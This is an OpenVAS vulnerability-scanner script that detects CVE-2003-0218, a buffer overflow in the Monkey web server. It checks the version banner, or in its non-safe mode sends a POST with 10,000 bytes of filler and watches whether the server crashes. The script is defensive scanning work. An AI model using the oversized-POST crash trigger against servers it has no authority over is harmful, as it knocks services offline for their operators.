# OpenVAS Vulnerability Test
# $Id: monkeyweb_too_big_post.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: MonkeyWeb POST with too much data
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Your web server crashes when it receives a POST command
with too much data.
It *may* even be possible to make this web server execute
arbitrary code with this attack.";

tag_solution = "Upgrade your web server.";

# Ref:
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# To: "BugTraq" <bugtraq@securityfocus.com>
# Subject: Monkey HTTPd Remote Buffer Overflow
# Date: Sun, 20 Apr 2003 16:34:03 -0500

if(description)
{
 script_id(11544);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2003-0218");
 script_bugtraq_id(7202);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 
 name = "MonkeyWeb POST with too much data";
 script_name(name);
 
 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 
 
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("Monkey/banner");
 # The listening port in the example configuration file is 2001
 # I suspect that some people might leave it unchanged.
 script_require_ports("Services/www",80, 2001);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80); # 2001 ?

if (safe_checks())
{
  banner = get_http_banner(port: port);
  if (banner =~ "Server: *Monkey/0\.([0-5]\.|6\.[01])")
  {
    report = "
The version of Monkey web server that you are running
is vulnerable to a buffer overflow on a POST command 
with too much data.
It is possible to make this web server crash or execute 
arbitrary code.

Solution: Upgrade to Monkey server 0.6.2";

    security_message(port: port, data: report);
  }

  exit(0);
}

if (http_is_dead(port:port)) exit(0);

l = get_kb_list(string("www/", port, "/cgis"));
if (isnull(l) || max_index(l) == 0)
  script = "/";
else
{
  # Let's take a random CGI.
  n = rand() % max_index(l);
  script = ereg_replace(string: l[n], pattern: " - .*", replace: "");
  if (! script) script = "/";	# Just in case the KB is corrupted
}

soc = http_open_socket(port);
if (! soc) exit(0);
req = http_post(item: script, port: port, data: crap(10000));
if ("Content-Type:" >!< req)
  req = ereg_replace(string: req, pattern: 'Content-Length:', 
	replace: 'Content-Type: application/x-www-form-urlencoded\r\nContent-Length:');

send(socket: soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port))
{
  security_message(port);
  set_kb_item(name:"www/too_big_post_crash", value:TRUE);
}
